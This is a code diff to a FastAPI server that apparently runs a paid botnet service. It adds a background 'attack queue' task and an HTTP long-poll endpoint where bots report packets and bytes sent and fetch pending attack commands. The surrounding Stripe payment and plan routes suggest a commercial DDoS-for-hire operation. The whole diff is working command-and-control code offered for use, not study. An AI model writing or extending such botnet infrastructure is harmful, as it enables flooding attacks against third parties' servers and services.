@@ -3,6 +3,7 @@ from fastapi import FastAPI, WebSocket, Request
 from fastapi.middleware.cors import CORSMiddleware
 from fastapi.responses import HTMLResponse, JSONResponse, FileResponse
 from fastapi.staticfiles import StaticFiles
+from pydantic import BaseModel
 import uvicorn, asyncio, uuid, os
 
 from app.database import init_redis, close_redis, engine, Base
@@ -35,6 +36,13 @@ async def lifespan(app: FastAPI):
             print("[MB] Payment scanner scheduled")
     except Exception as e:
         print(f"[MB] scanner schedule failed: {e}")
+    # Background tasks: auto-renew, webhook, attack queue
+    try:
+        from app.services.background_service import run_background_tasks
+        asyncio.create_task(run_background_tasks())
+        print("[BG] Background tasks started (auto-renew, queue, webhook)")
+    except Exception as e:
+        print(f"[BG] Background tasks failed: {e}")
     yield
     try:
         await close_redis()
@@ -63,6 +71,34 @@ app.include_router(plan_router.router)
 
 @app.websocket("/ws/bot/{bot_id}")
 async def bot_ws(ws: WebSocket, bot_id: str): await handle_bot_websocket(ws, bot_id)
+
+
+# ── HTTP/2 long-poll endpoint (gRPC-lite alternative to WebSocket) ──
+class PollRequest(BaseModel):
+    bot_id: str
+    cpu_usage: int = 0
+    packets_sent: int = 0
+    bytes_sent: int = 0
+
+
+@app.post("/ws/bot/poll")
+async def bot_poll(data: PollRequest):
+    """Long-poll endpoint for HTTP/2 mode bots. Returns pending commands."""
+    from app.services.bot_service import BotService
+    from app.websocket.bot_handler import manager
+
+    # Update heartbeat
+    try:
+        uid = uuid.UUID(data.bot_id)
+        await BotService.update_heartbeat(uid, data.cpu_usage, data.packets_sent, data.bytes_sent)
+    except Exception:
+        pass
+
+    # Check for pending attack commands
+    cmd = manager.get_pending_command(data.bot_id)
+    if cmd:
+        return JSONResponse(cmd)
+    return JSONResponse({"type": "idle"})
 
 @app.post("/api/payment/stripe/webhook")
 async def stripe_webhook(request: Request):
